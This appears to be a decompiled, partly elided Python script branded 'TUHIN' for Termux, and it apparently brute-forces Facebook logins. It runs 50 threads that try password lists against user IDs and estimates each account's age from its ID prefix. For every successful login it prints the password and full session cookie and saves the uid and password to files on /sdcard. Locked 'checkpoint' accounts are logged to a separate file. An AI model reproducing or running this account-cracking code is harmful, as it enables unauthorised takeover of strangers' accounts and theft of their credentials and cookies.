# Decompile by Mardis (Tools By Tuhin)
...
logo = ("""
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m TUHIN TERMUX COMMEND ZONE....          \033[1;32m ║
 \033[1;93m╚═════════════════[\033[1;93m TUHIN - TM-X \033[1;32m]══════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
...
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :TUHIN = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :TUHIN = '√ 2009'
        elif uid[:8] in ['10000000']        :TUHIN = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:TUHIN = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:TUHIN = ' 2010'
        elif uid[:6] in ['100001']          :TUHIN = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :TUHIN = '√ 2011/2012'
        elif uid[:6] in ['100004']          :TUHIN = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :TUHIN = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :TUHIN = '√ 2014/2015'
        elif uid[:6] in ['100009']          :TUHIN = '√ 2015'
        elif uid[:5] in ['10001']           :TUHIN = '√ 2015/2016'
        elif uid[:5] in ['10002']           :TUHIN = '√ 2016/2017'
        elif uid[:5] in ['10003']           :TUHIN = '√ 2018/2019'
        elif uid[:5] in ['10004']           :TUHIN = '√ 2019/2020'
        elif uid[:5] in ['10005']           :TUHIN = '√ 2020'
        elif uid[:5] in ['10006','10007','']:TUHIN = '√ 2021'
        elif uid[:5] in ['10008']           :TUHIN = '√ 2022'
        elif uid[:5] in ['10009']           :TUHIN = '√ 2023'
        else:TUHIN=''
...
def TUHIN():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m TUHIN')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[TUHIN-KING-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/TUHIN-KING-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m [TUHIN-KING-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/TUHIN-KING-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}TUHIN-KING {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
